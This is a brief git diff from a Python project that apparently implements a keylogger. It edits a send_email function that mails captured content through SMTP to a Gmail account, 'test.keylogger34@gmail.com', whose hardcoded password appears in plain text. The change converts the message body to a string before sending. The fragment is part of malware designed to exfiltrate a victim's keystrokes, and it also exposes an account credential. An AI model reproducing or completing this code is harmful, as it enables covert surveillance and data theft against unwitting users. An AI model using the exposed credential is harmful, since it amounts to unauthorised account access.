@@ -5,8 +5,7 @@ def send_email(subject, body, to_email):
     # E-posta gönderici ve alıcı bilgileri
     from_email = 'test.keylogger34@gmail.com'
     password = 'aqvjlaiscdpvosso'
-    
-    # E-posta başlık ve içeriği oluşturma
+    body = str(body)
     email_text = f"Subject: {subject}\n\n{body}"
     
     # SMTP sunucusuna bağlanma
